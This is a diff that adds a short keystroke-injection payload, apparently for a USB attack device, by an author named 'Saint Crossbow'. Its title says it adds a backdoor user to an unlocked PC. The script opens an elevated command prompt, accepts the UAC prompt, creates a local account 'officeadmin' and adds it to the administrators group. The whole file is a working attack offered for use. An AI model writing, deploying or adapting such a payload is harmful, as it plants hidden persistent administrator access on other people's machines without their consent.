@@ -1,0 +1,26 @@
+# Title: Add a backdoor user to access PC later (assuming PC is unlocked)
+# Author: Saint Crossbow
+# Version: 1.0
+
+MATCH __addadmin
+LED ATTACK
+
+BACKDOOR_USER="officeadmin"
+BACKDOOR_PASS="changethis"
+
+sleep 2
+Q GUI r
+Q STRING "cmd"
+Q CTRL-SHIFT ENTER
+sleep 2
+Q ALT Y
+sleep 1
+Q STRING "net user /add $BACKDOOR_USER $BACKDOOR_PASS"
+Q ENTER
+Q STRING "net localgroup administrators $BACKDOOR_USER /add"
+Q ENTER
+Q STRING "exit"
+Q ENTER
+LED FINISH
+sleep 1
+LED OFF
